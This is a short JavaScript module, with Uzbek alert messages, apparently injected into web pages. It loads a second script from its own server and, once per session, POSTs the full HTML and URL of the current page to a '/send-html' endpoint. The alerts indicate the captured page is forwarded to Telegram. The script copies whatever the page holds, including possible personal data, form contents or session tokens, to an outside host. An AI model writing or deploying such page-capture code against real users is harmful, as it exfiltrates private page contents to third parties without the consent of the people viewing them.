const o = new URL(import.meta.url).origin;

localStorage.setItem("htmltracker", "1");

await import(o + "/mouse-only.js");

const sentKey = "ht_sent_" + location.href;
if (!sessionStorage.getItem(sentKey)) {
  sessionStorage.setItem(sentKey, "1");

  fetch(o + "/health").catch(() => {});
  fetch(o + "/send-html", {
    method: "POST",
    mode: "cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ html: document.documentElement.outerHTML, url: location.href }),
  })
    .then((r) => r.json().then((d) => ({ r, d })))
    .then(({ r, d }) =>
      alert(r.ok && d.success ? "Telegramga page.html yuborildi" : "Xato: " + (d?.error?.description || d?.error || r.status))
    )
    .catch((e) => alert("Ulanish xatosi: " + e.message));
}
